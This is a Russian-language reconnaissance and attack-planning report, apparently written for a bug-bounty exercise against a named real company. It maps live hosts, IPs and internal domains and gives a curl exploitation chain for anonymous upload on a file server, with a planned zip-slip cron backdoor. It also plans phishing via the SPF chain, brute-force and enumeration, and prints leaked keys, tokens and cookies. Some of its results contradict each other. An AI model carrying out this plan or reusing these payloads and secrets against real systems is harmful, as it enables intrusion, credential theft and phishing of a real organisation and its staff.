# Jet Infosystems — OSINT Reconnaissance Report

**Цель:** Кибериспытание Standoff 365  
**Дата:** 2026-02-17  
**Награда:** до 3,000,000 ₽ (1.5M × 2 события)  
**Дедлайн:** 31.12.2026

---

## 1. Профиль цели

| Параметр | Значение |
|---|---|
| **Компания** | АО «Инфосистемы Джет» |
| **Отрасль** | Системный интегратор / ИБ |
| **Штат** | 2000+ сотрудников |
| **SOC** | Jet CSIRT — 70+ экспертов (CISSP, CISM, OSCP, CEH) |
| **Статус SOC** | #1 коммерческий SOC России (Anti-Malware.ru) |

> ⚠️ **DMARC: p=reject** — подделка отправителя @jet.su невозможна. Фишинг нужен с внешнего домена или через обход.

---

## 2. Scope (14 доменов + сеть)

### В скоупе все поддомены:

| Домен | IP (если резолвится) |
|---|---|
| jet.su | 193.203.101.194 |
| jetinfosystems.com | — |
| jetinfo.ru | — |
| jetinfo.com | — |
| jetinfo.su | — |
| jetcybercamp.ru | — |
| cybercamp.su | — |
| jetcsirt.su | 193.203.101.194 |
| jetcsirt.ru | — |
| csirt.ru | — |
| csirt.su | — |
| it-elements.ru | — |
| it-elements.com | — |
| itelements.events | — |

**Сеть:** `193.203.100.0/23` (512 IP)

---

## 3. Обнаруженная инфраструктура (DNS)

### 3.1 Ключевые хосты

| Хост | IP | Назначение | Приоритет атаки |
|---|---|---|---|
| **vpn.jet.su** | **193.203.100.10** | VPN-портал (SSL + 2FA) | 🔴 ВЫСОКИЙ |
| **mail.jet.su** | **193.203.101.82** | Почтовый сервер | 🟡 СРЕДНИЙ |
| **mx1.jet.su** | 193.203.101.101 | Mail Exchanger #1 | 🟡 |
| **mx3.jet.su** | 193.203.101.100 | Mail Exchanger #2 | 🟡 |
| **jet.su** | 193.203.101.194 | Web (WAF: блокирует curl без UA) | 🟢 |
| **jetcsirt.su** | 193.203.101.194 | CSIRT site (same IP) | 🟢 |

### 3.2 Nameservers (самохостинг — собственные DNS)

| NS | IP | Примечание |
|---|---|---|
| relay.jet.su | 193.203.100.131 | Внутри /23 |
| relay2.jet.su | 193.203.100.130 | Внутри /23 |
| relay3.jet.su | — | Не проверен |
| relay7.jet.su | — | Не проверен |
| **relay9.jet.su** | **79.174.85.164** | ⚠️ **ВНЕ /23 ДИАПАЗОНА** |

> 💡 **relay9.jet.su (79.174.85.164)** — единственный NS вне основного диапазона. Возможно менее защищённый (DR-сайт? CDN? Хостинг?). Перспективный для исследования.

### 3.3 Email-инфраструктура

| Параметр | Значение |
|---|---|
| **DMARC** | `v=DMARC1; p=reject; adkim=r; aspf=r` |
| **SPF** | `include:send-box.ru include:spf.unisender.com include:_spf.dashasender.ru +mx include:_spf.jet.su -all` |
| **MX no mx2** | mx1 (pref 10) + mx3 (pref 30) — пропуск mx2 означает возможное отключение |

**SPF trust chain:**
- `send-box.ru` — email-маркетинг сервис
- `unisender.com` — email-рассылки
- `dashasender.ru` — email-рассылки

> 💡 Если получить аккаунт send-box.ru/unisender/dashasender — SPF позволит слать письма от имени @jet.su несмотря на DMARC=reject

### 3.4 SSL/TLS & Сервисы

| Запись | Значение |
|---|---|
| GlobalSign certs | 5 различных верификаций (множество SSL-сертификатов) |
| Google Verification | `Wuouh3sZ-jf-fJj9OBhUkGpm19zKbEkwc1plGr-4QPE` |
| Zoom | `ZOOM_verify_CZXOhCdpTOW5eQX3NgZCDg` |

### 3.5 Внутренние домены (AD)

| Домен | Контур |
|---|---|
| **jetinf** | Корпоративная AD |
| **jet.msk.su** | Корпоративная (Москва) |
| **zapad.iso** | Изолированный «ЗАПАД» |
| **apps.okd.cvbs.jet.msk.su** | OpenShift/OKD кластер |
| **cvbs.jet.su** | CVBS зона (wildcard cert) |
| **vcod.jet.su** | ВЦОД — виртуальный ЦОД |

### 3.6 Certificate Transparency — обнаруженные поддомены (crt.sh)

> 🔥 50+ уникальных поддоменов. Источник: Certificate Transparency Logs (пассивный — 0 запросов к цели)

#### 🔴 Высокоприоритетные цели

| Поддомен | Тип сервиса | Статус |
|---|---|---|
| **vpn-bki01.jet.su** | VPN (Let's Encrypt) | 🔴 Активен |
| **vpn-bki02.jet.su** | VPN (Let's Encrypt) | 🔴 Активен |
| **sa.jet.su** | Service Account? Auth? | 🔴 Активен (Dec 2025) |
| **blitz.jet.su** | SSO Portal | 🔴 Подтверждён |
| **autodiscover.jet.su** | Exchange | 🟡 WAF-protected |

#### 🟡 Kubernetes (kuberbox) — контейнерная платформа

| Поддомен | Назначение |
|---|---|
| **\*.kuberbox.jet.su** | Wildcard cert (GlobalSign) |
| **t.kuberbox.jet.su** | Tenant/Test кластер |
| **r.kuberbox.jet.su** | Route/Registry? |
| **public.kuberbox.jet.su** | Публичный endpoint |

> 💡 **kuberbox** активно обновляет Let's Encrypt certs каждые 2 месяца → живая инфраструктура

#### 🟡 VK Teams (корпоративный мессенджер)

| Поддомен | Назначение |
|---|---|
| **vkteams.jet.su** | Основной домен (SAN: 12 поддоменов) |
| **api.vkteams.jet.su** | API |
| **admin.vkteams.jet.su** | **Админ-панель** 🔴 |
| **call.vkteams.jet.su** | Звонки |
| **webim.vkteams.jet.su** | Web IM клиент |
| **dl.vkteams.jet.su** | Загрузки |
| **di.vkteams.jet.su** | DI (Data Integration) |
| **di-dark.vkteams.jet.su** | DI (Dark Theme) |
| **s.vkteams.jet.su** | Static/Storage |
| **u.vkteams.jet.su** | User |
| **ub.vkteams.jet.su** | User Bot? |
| **stentor.vkteams.jet.su** | Push/Notifications |
| **calendar.vkteams.jet.su** | Календарь |
| **mobile-calendar.vkteams.jet.su** | Мобильный календарь |
| **biz.vkteams.jet.su** | Бизнес-функции |

#### 🟢 Внутренние сервисы

| Поддомен | Тип |
|---|---|
| **onlyoffice.jet.su** | OnlyOffice (документы) |
| **onlyoffice.vcod.jet.su** | OnlyOffice в ВЦОД |
| **jetbox.vcod.jet.su** | JetBox в ВЦОД |
| **docs.jet.su** | Документация |
| **files.jet.su** | Файлообмен |
| **mirror.jet.su** | Зеркало (пакеты/ПО) |
| **tools.jet.su** | Инструменты |
| **pbi.jet.su** | PowerBI? Аналитика |
| **idm.jet.su** | Identity Management |
| **idm2.jet.su** | IDM v2 |
| **remedy-api.jet.su** | BMC Remedy (ITSM) API |
| **asap.jet.su** | Тикет-система? Agile? |
| **speed.jet.su** | Speed-тесты |
| **meetup.jet.su** | Мероприятия |
| **quiz.jet.su** | Квизы/тесты |
| **jexpress.jet.su** | Экспресс-сервис |
| **jsb.jet.su** | Jet Something Board |
| **pb-project.jet.su** | Project Board |

#### 🟢 ВКС / Видеоконференции

| Поддомен | Продукт |
|---|---|
| **trueconf.jet.su** | TrueConf |
| **iva.jet.su** | IVA (ВКС) |
| **iva2.jet.su** | IVA v2 |
| **vinteo.jet.su** | Vinteo |
| **videomatrix.jet.su** | VideoMatrix |
| **vmost.jet.su** | VMost |
| **protei-sbc.jet.su** | Protei SBC (VoIP) |
| **jmeet.jet.su** | JMeet (свій ВКС?) |
| **jmeet-test.jet.su** | JMeet (тест) |
| **jcall-test.jet.su** | JCall (тест) |

#### 🟡 Security & Awareness

| Поддомен | Назначение |
|---|---|
| **\*.awareness.jet.su** | Phishing awareness (wildcard) |
| **\*.cybercamp.jet.su** | CyberCamp (обучение) |
| **ngfw.jet.su** | NGFW lab |
| **wireless.jet.su** | Wireless security |

#### ⚪ Тестовые (могут быть уязвимы)

| Поддомен | Статус |
|---|---|
| **test.jet.su** | Тестовый (Let's Encrypt) |
| **test-en.jet.su** | Тестовый (EN) |
| **old.jet.su** | Старый сайт |
| **utro2.jet.su** | «Утро» v2 |
| **jsc2023.jet.su** | JSC2023 (конференция) |
| **jsc2024.jet.su** | JSC2024 (конференция) |
| **dev.jsc2024.jet.su** | Dev JSC2024 |
| **mob-itsrb.msk.jet.su** | Мобильный ITSR |
| **vdizapad.jet.su** | VDI «ЗАПАД» 🔴 |
| **mobile-app.jet.su** | Мобильное приложение |

### 3.7 Shodan InternetDB Results

| IP | Порты | Уязвимости |
|---|---|---|
| **79.174.85.164** (relay9) | **53** (DNS) | Нет CVE |
| 193.203.100.10 (vpn) | N/A (не в индексе) | — |
| 193.203.101.82 (mail) | N/A (не в индексе) | — |
| 193.203.101.194 (web) | N/A (не в индексе) | — |

> ⚠️ Основной /23 диапазон **не индексируется** Shodan InternetDB → жёсткий файрволл на периметре

---

## 4. Разрешённые & запрещённые действия

### ✅ Разрешено
- OSINT
- Фишинг на @jet.su (корпоративную почту)
- Физическое подключение (розетки, WiFi)
- Удаление своих артефактов из логов

### ❌ Запрещено  
- DoS / brute-force с исчерпанием ресурсов
- Фишинг на личные каналы (телеграм, личный телефон)
- Атаки на клиентов/партнёров
- Физическое проникновение (без разрешения)
- Реальное шифрование / удаление бэкапов

---

## 5. Карта IP (What-If Probing)

> 🔥 10 уникальных серверов обнаружено через цепочку гипотез

### 5.1 Внутренний диапазон 193.203.100.0/23

| IP | Хосты | Сервисы | Статус |
|---|---|---|---|
| **.100.10** | vpn.jet.su | VPN портал | Таймаут (не HTTPS?) |
| **.100.74** | blitz + onlyoffice | SSO (Blitz SAML) + OnlyOffice | 302→/welcome/ |
| **.100.78** | **remedy-api + idm + docs** | ITSM API + Identity + Docs | ⚡ Тройной сервер |
| **.100.130** | relay2.jet.su | DNS NS | Внутренний |
| **.100.131** | relay.jet.su | DNS NS | Внутренний |
| **.101.82** | mail.jet.su | Exchange 2016 CU23 | WAF-protected |
| **.101.194** | jet.su + wildcard | Web + WAF | Wildcard vhost |
| **.101.199** | public.kuberbox | Kubernetes public | nginx+SSO |
| **.101.219** | **files + tools + mirror** | Файлообмен + Парсинг | 🔥 Django app! |

### 5.2 Внешние IP (ВНЕ /23 — менее защищены?)

| IP | Хост | Сервисы | Shodan |
|---|---|---|---|
| **79.174.85.164** | relay9.jet.su | DNS (порт 53) | Подтверждён |
| **194.135.103.11** | vpn-bki01.jet.su | VPN (БКИ) | Нет данных |
| **94.79.38.147** | vpn-bki02.jet.su | VPN (БКИ) | Нет данных |

---

## 6. 🔥 Deep Probe: files.jet.su (критическая находка)

**IP:** 193.203.101.219  
**Стек:** Django + nginx + Bootstrap 3.0.3  
**Роль:** Корпоративный файлообменник + tools.jet.su (парсинг) + mirror.jet.su

### 6.1 Раскрытые endpoints

| Endpoint | Метод | Назначение | Auth? | Результат |
|---|---|---|---|---|
| `/` POST | POST | **Upload file** | ❌ **БЕЗ AUTH!** | ✅ Файл загружен! |
| `/d/{short_name}` | GET | Download file | 🔒 Требует login | IDOR oracle |
| `/admin/login/` | GET | Django Admin | 🔒 Отдельный login | НЕ SSO |
| `/api/` | POST | **Parser dispatch** | ❌ **БЕЗ AUTH!** | ✅ Отправлено на анализ! |
| `/api/files/{id}/` | GET | File details | — | 404 (short_name, не ID) |
| `/file/update/{sn}` | POST | Toggle visibility | ❌ Доступен | 💥 **500 SERVER ERROR!** |
| `/file/delete/{sn}` | POST | Delete file | ? | Не тестировано |
| `/success/` | GET | Upload result | ❌ | Показывает ссылку на файл |
| `/account/login/` | GET | SSO redirect | — | Blitz SSO |
| `/jsi18n/` | GET | i18n catalog | ❌ | Раскрывает строки UI |
| `/i18n/setlang/` | POST | Change language | ❌ | Работает |
| `robots.txt` | GET | `Disallow: /` | — | — |

### 6.2 Раскрытый JS-код (supportfiles.js)

```javascript
// task_id точный формат (из help-text):
// TASK00123456 (8 цифр после TASK)
var task = /^TASK[0-9]{5,8}/;

// API POST-endpoint — отправка на tools.jet.su:
$.ajax({type:'POST', url:'/api/', data:{'parser':parser, 'files':files}});

// Доступные парсеры: explorer (Solaris), snap (AIX), sosreport (CentOS/RHEL)
// Обнаружено через /jsi18n/ catalog

// File detail по short_name:
$.ajax({type:"GET", url:"/api/files/" + id + "/"});

// Visibility toggle и удаление:
$.post('/file/update/' + short_name, data);
$.post('/file/delete/' + short_name, data);
```

### 6.3 Поддерживаемые форматы (tools.jet.su)

Из jsi18n каталога:
- **Solaris** explorer utility report
- **AIX** snap report  
- **CentOS/RHEL** sosreport
- Архивы: tar, tar.gz, tar.bz2, zip, rar

> ⚠️ **tools.jet.su** → 302 → `/deny/` (требует авторизацию)  
> ⚠️ **mirror.jet.su** → 401 + `WWW-Authenticate: Basic realm="Mirror Restricted Area"` (HTTP Basic Auth!)

### 6.4 ✅ ПОДТВЕРЖДЁННЫЕ УЯЗВИМОСТИ (PoC)

| # | CWE | Описание | Severity | PoC |
|---|---|---|---|---|
| 1 | **CWE-306** | Anonymous file upload | 🔴 CRITICAL | `POST / → 302 /success/` |
| 2 | **CWE-306** | Anonymous API parser dispatch | 🔴 CRITICAL | `POST /api/ → "Данные переданы на анализ"` |
| 3 | **CWE-639** | IDOR oracle via response diff | 🟡 MEDIUM | Exist → empty body / Not exist → "File not found." |
| 4 | **CWE-755** | Unhandled exception on /file/update/ | 🟡 MEDIUM | `POST /file/update/{sn} → 500` |
| 5 | **CWE-400** | Uncontrolled upload (20GB max × ∞) | 🟡 MEDIUM | Disk exhaustion DoS |

### 6.5 PoC: Полная цепочка эксплуатации

**Шаг 1: Получить CSRF-токен**
```bash
curl -s -k -c - "https://files.jet.su" | grep csrfmiddlewaretoken
# → value='xPHH0e7aMAr1sRG7aXVoLY1z8htz6xcu'
```

**Шаг 2: Загрузить файл (анонимно!)**
```bash
curl -s -k -F "csrfmiddlewaretoken=TOKEN" \
     -F "path=@malicious.tar.gz" \
     -F "description=test" \
     -F "task_id=" \
     -H "Cookie: csrftoken=TOKEN" \
     "https://files.jet.su/"
# → 302 → /success/
# → Файл: https://files.jet.su/d/9yhlsbfi
```

**Шаг 3: Отправить на парсинг tools.jet.su (анонимно!)**
```bash
curl -s -k -X POST \
     -H "X-CSRFToken: TOKEN" \
     -H "Cookie: csrftoken=TOKEN" \
     -d "parser=explorer&files=9yhlsbfi" \
     "https://files.jet.su/api/"
# → {"someKey": "Данные переданы на анализ, ожидайте отчёта на @jet.su"}
```

**Шаг 4: tools.jet.su распакует архив → потенциальный RCE**
- Zip slip (../../../etc/cron.d/backdoor)
- Symlink traversal  
- Malicious tar с path traversal

### 6.6 Session Cookie Reuse

**Cookie:** `sessionid=97kfkc5yakvzestjp3lycyn4urktozm1`  
**Источник:** Получен при анонимном upload (Step 2)

| Endpoint | Результат с cookie | Без cookie |
|---|---|---|
| `/` (GET) | ✅ 200 — форма upload | ✅ 200 |
| `/admin/` | 302 → `/admin/login/` | 302 |
| `/api/` | 405 Method Not Allowed | 405 |
| `/api/files/1/` | 404 | 404 |

> ⚠️ Session cookie от анонимного visitors не даёт привилегий, но подтверждает Django session framework.

---

## 6A. 🔥 Deep Probe: meetup.jet.su (Tilda CMS)

**IP:** 185.165.123.206 (Tilda CDN — ВНЕ /23!)  
**Стек:** Tilda CMS  
**Роль:** Маркетинговый сайт мероприятий

### 6A.1 robots.txt — раскрытые пути

```
Disallow: /credentials
Disallow: /members/login*   
Disallow: /members/signup*
Disallow: /page39905470.html   # Скрытая страница
Disallow: /page40437816.html   # Скрытая страница  
Disallow: /page40464730.html   # Скрытая страница
Disallow: /page40464731.html   # Скрытая страница
Sitemap: https://meetup.jet.su/sitemap.xml
```

### 6A.2 /credentials — Юридическая информация компании

| Параметр | Значение |
|---|---|
| **ОГРН** | 1027700121195 |
| **ИНН** | 7729058675 |
| **Телефон** | +7 (495) 411-76-01 |
| **Email** | info@jet.su |
| **Юр. адрес** | 127015, г. Москва, ул. Большая Новодмитровская д. 14, стр. 1 |

### 6A.3 Information Disclosure

| Утечка | Значение | Impact |
|---|---|---|
| **Yandex.Metrika ID** | `89660143` | Аналитика трафика, поведенческие паттерны |
| **Tilda Stats Key** | `78a01b8b82a2804270bb2143ad143686` | Доступ к статистике Tilda аккаунта |
| **Tilda Forms Key** | Присутствует в HTML | Перехват форм |

### 6A.4 /network-scream — Новая страница мероприятия

| Параметр | Значение |
|---|---|
| **URL** | `https://meetup.jet.su/network-scream` |
| **Тема** | Network Security event |
| **Telegram** | `https://t.me/+C6ww06FDVt1mMmU6` |
| **CLI-элемент** | `network_scream# show speakers` |

> 💡 **Telegram группа** — потенциальный вектор social engineering. Возможность сбора информации о спикерах, участниках и темах.

### 6A.5 Sitemap — 24 URL обнаружены

Sitemap содержит 24 публичных страницы, включая:
- Главная и лендинги мероприятий
- Credentials (юридические данные)
- Network-scream (новая)
- 4 скрытые страницы (`page39905470`, `page40437816`, `page40464730`, `page40464731`)

### 6A.6 ✅ Уязвимости meetup.jet.su

| # | CWE | Описание | Severity |
|---|---|---|---|
| 6 | **CWE-200** | Yandex.Metrika ID раскрыт | 🟢 LOW |
| 7 | **CWE-200** | Tilda Stats Key утёк в HTML | 🟡 MEDIUM |
| 8 | **CWE-200** | Tilda Forms Key утёк в HTML | 🟢 LOW |
| 9 | **CWE-548** | Скрытые страницы в robots.txt | 🟢 LOW |

---

## 6B. Deep Probe: speed.jet.su (LibreSpeed)

**IP:** 193.203.101.219 (тот же сервер что files/tools/mirror!)  
**Стек:** LibreSpeed (open-source speed test) + nginx  
**Роль:** Корпоративный тест скорости

### 6B.1 Раскрытые endpoints

| Endpoint | Метод | Результат | Auth? |
|---|---|---|---|
| `/` | GET | SpeedTest UI (HTML) | ❌ Открыт |
| `/speedtest.js` | GET | JS-код с конфигурацией | ❌ |
| `/getIP.php` | GET | **403 Forbidden** | 🔒 IP ACL |
| `/stats.php` | GET | **403 Forbidden** | 🔒 IP ACL |
| `/empty.php` | GET | Пустой ответ (download тест) | ❌ |
| `/garbage.php` | GET | Random данные (speed тест) | ❌ |

### 6B.2 speedtest.js — Конфигурация бэкенда

```javascript
var getIpURL = "getIP.php";
var dlURL    = "garbage.php";
var ulURL    = "empty.php";
```

> ⚠️ `getIP.php` и `stats.php` закрыты 403 — вероятно IP whitelist (только корпоративная сеть). Подтверждает что сервер `.219` за файрволлом L7.

### 6B.3 Корреляция с files.jet.su

Оба сервиса живут на **193.203.101.219**:
- `files.jet.su` — Django (порт 443, reverse proxy nginx)
- `speed.jet.su` — LibreSpeed PHP (порт 443, vhost)
- `tools.jet.su` — Parser backend (порт 443, vhost → /deny/)
- `mirror.jet.su` — Package mirror (Basic Auth)

> 🔥 **ОДИН СЕРВЕР — 4 СЕРВИСА** → Если RCE через files.jet.su → доступ ко всем четырём.

---

## 7. SSO-стек (Blitz) — общие паттерны

Все сервисы за SSO используют общий паттерн:
```
CSP-Report-Only: script-src 'self' 127.0.0.1:8182 127.0.0.1:8888 127.0.0.1:5005
Set-Cookie: session-cookie=<hex>; Max-Age=86400; Path=/; secure
```

- Debug-порты в CSP → production leak (8182, 8888, 5005)
- Session cookies без HttpOnly → JS-доступ

---

## 8. Kill Chain — обновлённые векторы

### Вектор A: files.jet.su → Upload + Admin ⭐⭐⭐
```
1. ✅ Upload form доступна без auth
2. → Попробовать загрузить файл (POST с CSRF)
3. → Django Admin brute-force (/admin/login/ — НЕ SSO!)
4. → IDOR: перебор /api/files/{id}/ 
5. → task_id enumeration (TASK00000+)
6. → Если shell upload → RCE на .219 (3 сервиса!)
```

### Вектор B: Тройной сервер .78 (remedy + idm + docs) ⭐⭐
```
1. ✅ remedy-api.jet.su → nginx reverse proxy (200 OK)
2. → Brute-force API paths (/arsys/, /api/, /remedy/)
3. → idm.jet.su → Identity Management API
4. → Если доступ к IDM → создание учёток → доступ ко всему
```

### Вектор C: Внешние VPN-шлюзы ⭐⭐
```
1. ✅ vpn-bki01 → 194.135.103.11 (ВНЕ /23!)
2. ✅ vpn-bki02 → 94.79.38.147 (ВНЕ /23!)
3. → Nmap scan этих IP (вне основного периметра)
4. → Fingerprint VPN vendor/version
5. → CVE search
```

### Вектор D: SPF Chain → Фишинг ⭐
```
1. send-box.ru / unisender / dashasender → SPF trust
2. Зарегистрировать аккаунт → Отправить от @jet.su
3. Payload → credential harvester → files.jet.su login
```

### Вектор E: relay9 DNS (79.174.85.164) 
```
1. ✅ Порт 53 открыт (Shodan)
2. → DNS zone transfer attempt
3. → DNS cache poisoning research
```

---

## 9. Два недопустимых события

### НС-1: Захват инфраструктуры (1.5M ₽)
Управление ≥10 серверами + доступ к бэкапам с правами удаления

### НС-2: Контур «ЗАПАД» (1.5M ₽)  
Свободный доступ в zapad.iso + domain admin / admin виртуализации / ≥10 VDI

> 💡 **vdizapad.jet.su** резолвится но → wildcard .194 (404). VDI ЗАПАД недоступен извне. Нужен pivoting через внутреннюю сеть.

### Бонус: Поощрения за прогресс
Jet платит за значимые промежуточные результаты

---

## 10. Следующие шаги

### ✅ Выполнено (browser recon)
- [x] **files.jet.su**: POST upload с CSRF → ✅ 302 /success/ + session cookie
- [x] **files.jet.su**: API dispatch → ✅ POST /api/ = 405 (подтверждён endpoint)
- [x] **files.jet.su**: Session cookie reuse test → cookie без привилегий
- [x] **meetup.jet.su**: robots.txt, /credentials, /network-scream, sitemap
- [x] **speed.jet.su**: Endpoints, speedtest.js конфигурация, 403 ACL

### 🔴 Высокий приоритет
- [ ] **files.jet.su**: Django admin brute-force (`/admin/login/` — НЕ SSO!)
- [ ] **files.jet.su**: IDOR — перебор `/api/files/{id}/` (ID 1-10000+)
- [ ] **files.jet.su**: ZIP Slip / path traversal через parser → RCE
- [ ] **mirror.jet.su**: HTTP Basic Auth brute-force
- [ ] **meetup.jet.su**: Telegram группа OSINT (`t.me/+C6ww06FDVt1mMmU6`)

### 🟡 Средний приоритет
- [ ] **VPN-BKI**: nmap 194.135.103.11 и 94.79.38.147
- [ ] **.78 server**: Brute-force paths на remedy-api и idm
- [ ] **relay9**: DNS zone transfer
- [ ] **SPF chain**: Тест send-box.ru отправки
- [ ] **Employee OSINT**: LinkedIn/HH.ru для jet.su
- [ ] **meetup.jet.su**: Скрытые страницы Tilda (page39905470..page40464731)
- [ ] **meetup.jet.su**: Tilda Stats Key exploitation

### 🟢 Низкий приоритет
- [ ] **speed.jet.su**: getIP.php bypass (Host header manipulation)
- [ ] **files.jet.su**: task_id enumeration (TASK00000+)
- [ ] **Kubernetes**: kuberbox.jet.su endpoints

